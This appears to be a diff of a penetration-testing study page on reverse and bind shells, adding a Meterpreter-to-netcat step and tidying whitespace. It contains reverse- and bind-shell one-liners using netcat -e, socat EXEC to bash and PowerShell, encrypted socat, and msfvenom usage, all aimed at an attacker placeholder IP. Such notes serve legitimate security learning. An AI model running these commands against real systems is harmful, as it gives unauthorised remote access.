@@ -2,7 +2,6 @@
 icon: terminal
 ---
 
-
 # Shells
 
 ### Key Concepts
@@ -17,7 +16,7 @@ Non-Interactive: limited to using programs that don't require user interaction. 
 
 ## Reverse Shells
 
-Target is forced to execute code that connects back to you computer. Attacker uses a listener to catch connection.&#x20;
+Target is forced to execute code that connects back to you computer. Attacker uses a listener to catch connection.
 
 {% hint style="info" %}
 Can bypass firewalls rules and is far more commonly used.
@@ -39,6 +38,11 @@ Can bypass firewalls rules and is far more commonly used.
 By default, netcat reverse shells are very unstable. We have to upgrade them.
 {% endhint %}
 
+#### Meterpreter to Netcat Shell
+
+1. `meterpreter> shell` to open a standard shell
+2. `nc -e /bin/bash <YOUR_IP> <PORT>` to start a netcat reverse shell from target machine
+
 #### Upgrading a Netcat Shell
 
 Python:
@@ -52,19 +56,19 @@ Python:
 
 rlwrap (Good for Windows shells):
 
-1. `rlwrap nc -lvnp PORT_NUMBER`&#x20;
+1. `rlwrap nc -lvnp PORT_NUMBER`
 2. Same process as above to stabilize
 
 Socat:\
 use netcat as a stepping stone into a fully-featured Socat shell, only on Linux targets. Can use Socat for basic Windows shells.
 
 1. Transfer a socat static compiled binary to target machine
-2. Windows:&#x20;
+2. Windows:
    1. `socat TCP-L:PORT` for listener
-   2. `socat TCP:LOCAL_IP:PORT EXEC:powershell.exe,pipes`&#x20;
+   2. `socat TCP:LOCAL_IP:PORT EXEC:powershell.exe,pipes`
 3. Linux (with stabilization)
    1. `socat TCP-L:PORT FILE:tty,raw,echo=0` for listener
-   2. `socat TCP:LOCAL_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane`&#x20;
+   2. `socat TCP:LOCAL_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
 
 We can also use encrypted socat shells, by replacing `TCP` with `OPENSSL` . You must have an SLL Certificate on the attacking machine:
 
@@ -83,7 +87,7 @@ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 
 Used to generate code for reverse and bind shell, can also be used to generate hexadecimal shell code for buffer overflow exploit. Payloads in various formats of your choosing.
 
-`msfvenom -p PAYLOAD OPTIONS`&#x20;
+`msfvenom -p PAYLOAD OPTIONS`
 
 `-f` specify output format
 
@@ -114,11 +118,9 @@ exploit -j #-j to run as background
 
 Some websites allow the ability to upload an executable file to active a reverse or bind shell. They are typically run inside a webserver in a language like PHP.
 
-
-
 ## Bind Shells
 
-The code executed is a listener attached to a shell directly on the target.&#x20;
+The code executed is a listener attached to a shell directly on the target.
 
 {% hint style="info" %}
 May be protected by firewalls and is far less common.
@@ -127,6 +129,3 @@ May be protected by firewalls and is far less common.
 On target machine: `nc -lvnp -e "cmd.exe"`
 
 On attacker machine: `nc MACHINE_IP`
-
-
-
